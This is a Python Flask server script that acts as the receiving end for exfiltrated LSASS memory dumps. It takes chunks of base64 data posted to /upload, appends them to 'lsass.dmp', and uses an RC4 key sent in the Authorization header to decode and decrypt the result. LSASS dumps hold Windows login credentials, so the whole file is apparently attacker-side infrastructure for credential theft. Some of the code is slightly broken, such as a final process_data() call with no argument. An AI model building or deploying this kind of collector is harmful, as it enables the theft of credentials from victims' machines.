#!/usr/bin/env python3

from flask import Flask, request
import base64

app = Flask(__name__)

class RC4:
    def __init__(self, key):
        if isinstance(key, str):
            key = key.encode('utf-8')
        self.state = list(range(256))
        j = 0
        for i in range(256):
            j = (j + self.state[i] + key[i % len(key)]) % 256
            self.state[i], self.state[j] = self.state[j], self.state[i]

    def process(self, data):
        i = j = 0
        result = bytearray()
        for byte in data:
            i = (i + 1) % 256
            j = (j + self.state[i]) % 256
            self.state[i], self.state[j] = self.state[j], self.state[i]
            result.append(byte ^ self.state[(self.state[i] + self.state[j]) % 256])
        return result

    # Alias for convenience since RC4 is symmetric
    encrypt = decrypt = process

file = ""
try:
    file = open('lsass.dmp','w')
    file.write("")
except FileNotFoundError:
    file = open('lsass.dmp','x')
file.close()

@app.route('/upload', methods=['POST'])
def upload():
    if request.headers.get('Authorization') is not None:
        rc4_key = request.headers.get('Authorization').split(' ',1)[1]
        process_data(rc4_key)
        return "Key Received", 200

    data = request.data.decode()
    with open('lsass.dmp','a') as f:
        f.write(data)

    return "Data Received", 200

def process_data(rc4_key):
    # Reassemble data
    with open('lsass.dmp','rb') as f:
        full_data = f.read()

    # Base64 decode
    decoded_data = base64.b64decode(full_data)

    # Decrypt with RC4
    rc4 = RC4(rc4_key)
    decrypted_data = rc4.encrypt(decoded_data)  # RC4 is symmetric, so encrypt method will decrypt

    # Write to a file
    with open("lsass.dmp", "wb") as file:
        file.write(decrypted_data)

    print("Data processed and saved to lsass.dmp")

if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1', port=443)
    process_data()
